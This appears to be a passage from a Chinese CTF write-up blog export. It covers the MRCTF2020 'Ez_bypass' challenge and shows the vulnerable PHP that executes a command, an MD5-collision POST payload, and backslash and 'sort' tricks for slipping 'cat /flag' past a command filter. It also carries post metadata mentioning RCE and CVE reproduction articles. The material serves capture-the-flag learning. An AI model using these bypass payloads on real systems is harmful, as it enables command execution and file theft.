punctuation\">(</span><span class=\"token string double-quoted-string\">\"forbid ~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string backtick-quoted-string\">`$cmd`</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"md5 is funny ~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n  <span class=\"token selector\">body</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token property\">background</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>./bj.png<span class=\"token punctuation\">)</span></span>  no-repeat center center<span class=\"token punctuation\">;</span>\n   <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span>cover<span class=\"token punctuation\">;</span>\n   <span class=\"token property\">background-attachment</span><span class=\"token punctuation\">:</span>fixed<span class=\"token punctuation\">;</span>\n   <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>#CCCCCC<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>好家伙过滤了挺多的命令,没法直接用数组绕过md5验证，因为数组的string后都是”array”</p>\n<p>考察的时md5的强验证，这里有一个payload可以用：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">b</span><span class=\"token operator\">=</span>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201029173207820.png\" alt=\"image-20201029173207820\"></p>\n<p>flag在根目录下</p>\n<p>cat被过滤了，但是可以使用<code>\\</code>绕过，比如ca\\t+/flag绕过，ta\\c+/flag绕过</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201029174831141.png\" alt=\"image-20201029174831141\"></p>\n<p>或者使用sort命令，sort+/flag来绕过</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201029175028520.png\" alt=\"image-20201029175028520\"></p>\n","text":"[MRCTF2020]你传你🐎呢考点：文件上传、图片马 上传绕过怎么绕呢，试了上传php,php3，php4，phtml都是没过滤了。试了一下jpg和.htaccess文件都可以上传，所以就可以使用图片马，并且直接给出了路径，友好。 上传一个.htaccess文件 AddType...","link":"","photos":[],"count_time":{"symbolsCount":"7.6k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2\"><span class=\"toc-text\">[MRCTF2020]你传你🐎呢</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MRCTF2020-Ez-bypass\"><span class=\"toc-text\">[MRCTF2020]Ez_bypass</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">[GKCTF2020]cve版签到</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-old-hack\"><span class=\"toc-text\">[BJDCTF 2nd]old-hack</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83\"><span class=\"toc-text\">[GXYCTF2019]禁止套娃</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Alocaleconv\"><span class=\"toc-text\">方法一：localeconv()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Areverse\"><span class=\"toc-text\">方法二：reverse()</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9Asession%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">方法三：session方法</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GXYCTF2019-BabyUpload\"><span class=\"toc-text\">[GXYCTF2019]BabyUpload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web\"><span class=\"toc-text\">[安洵杯 2019]easy_web</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"无参数函数RCE","uid":"452153053cb456e93e9f321b6100ce19","slug":"无参数函数RCE","date":"2020-10-27T08:24:44.000Z","updated":"2020-10-27T13:33:46.000Z","comments":true,"path":"api/articles/无参数函数RCE.json","keywords":"A1andNS","cover":[],"text":"最近做题遇到了无参数函数来RCE的题，这里记录一下一些想法，以备后来查证。 这种题目的做法基本上就是，利用超级全局变量来进行bypass，利用函数的嵌套的替代参数的出现。然后进行任意文件读取。 无参数函数通常来说如果在PHP中有一个语句 eval($_POST['cmd']); ...","link":"","photos":[],"count_time":{"symbolsCount":"5.9k","symbolsTime":"5 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":32,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Bypass","slug":"Bypass","count":1,"path":"api/tags/Bypass.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"CVE-2020-16898 Windows tcp/ip远程代码执行漏洞复现","uid":"78ded4e7cb4de2a6c1a7e1af4840fe78","slug":"CVE-2020-16898-Windows-tcp-ip远程代码执行漏洞复现","date":"2020-10-26T07:03:53.000Z","updated":"2020-10-26T08:24:54.000Z","comments":true,"path":"api/articles/CVE-2020-16898-Windows-tcp-ip远程代码执行漏洞复现.json","keywords":"A1andNS","cover":[],"text":"这个月的微软安全更新日，微软发布了补丁修复，TCP/IP远程执行代码漏洞(CVE-2020-16898),官方评级严重，漏洞评分： 9.8，这里来复现一下漏洞利用，至于照成栈溢出，我就不太知道。 漏洞简述远程攻击者通过 构造特制的ICMPv6 Router Advertiseme...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":5,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"漏洞复现","slug":"漏洞复现","count":6,"path":"api/tags/漏洞复现.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}